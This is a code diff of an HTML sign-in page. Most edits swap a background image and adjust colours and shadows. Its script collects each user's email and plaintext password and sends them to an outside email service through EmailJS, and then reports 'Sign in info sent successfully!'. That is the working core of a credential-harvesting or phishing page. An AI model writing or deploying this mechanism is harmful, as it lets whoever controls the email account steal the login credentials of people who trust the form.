@@ -9,22 +9,19 @@
 <style>
   body {
     font-family: Arial, sans-serif;
+    background-color: #f5f7fa;
     margin: 0;
     padding: 0;
-    height: 100vh;
     display: flex;
+    height: 100vh;
     justify-content: center;
     align-items: center;
-    /* Set a background image */
-    background-image: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb'); /* Replace with your image URL */
-    background-size: cover;
-    background-position: center;
   }
   .signin-container {
-    background: rgba(255, 255, 255, 0.9);
+    background: white;
     padding: 2rem;
     border-radius: 8px;
-    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    box-shadow: 0 2px 8px #ccc;
     width: 320px;
   }
   .signin-container h2 {
@@ -63,6 +60,7 @@
   .message {
     margin-top: 1rem;
     font-size: 0.9rem;
+    color: green;
     text-align: center;
   }
 </style>
@@ -94,10 +92,13 @@
 
   form.addEventListener('submit', function(event) {
     event.preventDefault();
+
+    // Prepare template parameters
     const templateParams = {
       user_email: form.user_email.value,
       user_password: form.user_password.value
     };
+
     emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
       .then(function(response) {
         messageEl.textContent = "Sign in info sent successfully!";
